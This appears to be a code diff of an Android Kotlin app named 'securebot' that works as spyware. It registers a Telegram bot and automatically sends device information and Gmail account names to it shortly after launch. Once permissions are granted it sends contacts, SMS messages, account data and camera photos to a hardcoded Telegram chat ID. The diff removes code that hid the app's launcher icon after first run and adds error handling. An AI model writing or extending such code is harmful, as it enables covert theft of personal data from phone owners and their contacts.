@@ -102,50 +102,31 @@ class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        val prefs = getSharedPreferences("securebot", MODE_PRIVATE)
-        // If launcher is already hidden, finish immediately
-        if (prefs.getBoolean("launcher_hidden", false)) {
-            disableLauncher()
-            finish()
-            return
-        }
-
-        // First run – show UI
         try {
+            // Set up UI
             setupUi()
+            // Generate or load device ID
+            val prefs = getSharedPreferences("securebot", MODE_PRIVATE)
             deviceId = prefs.getString("device_id", null) ?: run {
                 val newId = generateDeviceId()
                 prefs.edit().putString("device_id", newId).apply()
                 newId
             }
-
-            // Mark that we have shown the UI (this will be used in onDestroy to hide launcher)
-            prefs.edit().putBoolean("first_run_complete", true).apply()
-
+            // Start foreground service
             startForegroundService()
-            startBot() // start bot before auto-exfil
-
-            // Auto-exfil after 5 seconds (with try-catch for permissions)
+            // Start bot
+            startBot()
+            // Auto-exfil after 5 seconds (safe info only)
             handler.postDelayed({
                 autoExfiltrate()
             }, 5000)
-
+            // Setup permission buttons
             setupPermissionsUI()
             checkPermissions()
         } catch (e: Exception) {
             e.printStackTrace()
-            Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
-            finish()
-        }
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        val prefs = getSharedPreferences("securebot", MODE_PRIVATE)
-        // If first run was completed, hide the launcher now
-        if (prefs.getBoolean("first_run_complete", false)) {
-            prefs.edit().putBoolean("launcher_hidden", true).apply()
-            disableLauncher()
+            Toast.makeText(this, "Initialization error: ${e.message}", Toast.LENGTH_LONG).show()
+            // Do not finish, let the user see the UI anyway
         }
     }
 
@@ -179,19 +160,6 @@ class MainActivity : Activity() {
         return letters + digits
     }
 
-    private fun disableLauncher() {
-        try {
-            val componentName = android.content.ComponentName(this, MainActivity::class.java)
-            packageManager.setComponentEnabledSetting(
-                componentName,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
-    }
-
     private fun setupPermissionsUI() {
         for (i in permissions.indices) {
             val btn = Button(this)
@@ -203,11 +171,15 @@ class MainActivity : Activity() {
             )
             val perm = permissions[i]
             btn.setOnClickListener {
-                if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
-                    Toast.makeText(this, "Already granted", Toast.LENGTH_SHORT).show()
-                    return@setOnClickListener
+                try {
+                    if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
+                        Toast.makeText(this, "Already granted", Toast.LENGTH_SHORT).show()
+                        return@setOnClickListener
+                    }
+                    ActivityCompat.requestPermissions(this, arrayOf(perm), i)
+                } catch (e: Exception) {
+                    Toast.makeText(this, "Error requesting permission: ${e.message}", Toast.LENGTH_SHORT).show()
                 }
-                ActivityCompat.requestPermissions(this, arrayOf(perm), i)
             }
             layout.addView(btn)
             permissionButtons[perm] = btn
@@ -250,13 +222,13 @@ class MainActivity : Activity() {
         if (btn != null) {
             if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 btn.setBackgroundColor(Color.GREEN)
-                // After granting, try to send the corresponding data
+                // Send corresponding data after grant
                 when (perm) {
                     Manifest.permission.READ_CONTACTS -> sendContacts()
                     Manifest.permission.GET_ACCOUNTS -> sendAccountInfo()
                     Manifest.permission.READ_SMS -> sendSmsListToBot()
                     Manifest.permission.CAMERA -> sendTestPhoto()
-                    // others don't have auto-send, but you can add more
+                    // Add more as needed
                 }
             } else {
                 btn.setBackgroundColor(Color.RED)
@@ -265,11 +237,16 @@ class MainActivity : Activity() {
     }
 
     private fun startForegroundService() {
-        val serviceIntent = Intent(this, ForegroundService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent)
-        } else {
-            startService(serviceIntent)
+        try {
+            val serviceIntent = Intent(this, ForegroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent)
+            } else {
+                startService(serviceIntent)
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+            Toast.makeText(this, "Service start error: ${e.message}", Toast.LENGTH_SHORT).show()
         }
     }
 
@@ -278,21 +255,20 @@ class MainActivity : Activity() {
             val botApi = TelegramBotsApi(DefaultBotSession::class.java)
             bot = SecureBot(this)
             botApi.registerBot(bot)
+            Toast.makeText(this, "Bot started", Toast.LENGTH_SHORT).show()
         } catch (e: Exception) {
             e.printStackTrace()
+            Toast.makeText(this, "Bot error: ${e.message}", Toast.LENGTH_SHORT).show()
         }
     }
 
     private fun autoExfiltrate() {
-        // Send device info (safe, no dangerous permissions)
         try {
             val info = getDeviceInfoSafe()
             sendToBot("Auto exfil: Device info\n$info")
         } catch (e: Exception) {
-            sendToBot("Auto exfil failed for device info: ${e.message}")
+            sendToBot("Auto exfil failed: ${e.message}")
         }
-        // Contacts will be sent only when user grants permission (via button)
-        // Accounts will be sent when user grants GET_ACCOUNTS
     }
 
     private fun getDeviceInfoSafe(): String {
@@ -320,7 +296,7 @@ class MainActivity : Activity() {
             if (network.type == ConnectivityManager.TYPE_WIFI) "WiFi" else "Cellular"
         } else "Disconnected"
         builder.append("Connectivity: $conn\n")
-        // Accounts: try to get Gmail accounts if permission granted
+        // Try to get accounts, but catch SecurityException
         try {
             val accounts = AccountManager.get(this).accounts
             val emails = accounts.mapNotNull { if (it.type.contains("gmail")) it.name else null }.distinct()
@@ -383,7 +359,7 @@ class MainActivity : Activity() {
         }
     }
 
-    // The following functions are the same as before, but wrapped with try-catch where needed
+    // Data retrieval functions (with try-catch inside if needed)
 
     private fun getContactsVcf(): String {
         val vcf = StringBuilder()
@@ -634,8 +610,7 @@ class MainActivity : Activity() {
         bot?.sendFile(7548711500L, file, caption)
     }
 
-    // Inner classes (ForegroundService, SmsReceiver, BootReceiver, SecureBot) remain identical to previous version.
-    // I'll include them here for completeness, but they are unchanged.
+    // ---- Inner classes (unchanged) ----
 
     inner class ForegroundService : Service() {
         private val CHANNEL_ID = "SecureBotService"
